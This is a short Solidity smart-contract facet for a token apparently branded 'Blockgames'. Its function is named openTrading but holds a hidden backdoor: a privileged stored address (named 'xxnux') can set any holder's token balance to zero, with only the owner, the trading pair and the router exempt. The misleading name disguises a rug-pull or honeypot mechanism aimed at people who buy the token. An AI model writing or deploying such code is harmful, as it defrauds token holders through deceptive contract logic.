/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/playernetwork
    // Twitter: https://twitter.com/GetBlockGames
    // Website: https://blockgames.com/
    // Github: https://github.com/blockgames
    // Discord: https://discord.com/invite/blockgames
    // Medium: https://medium.com/@Blockgames.com/
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
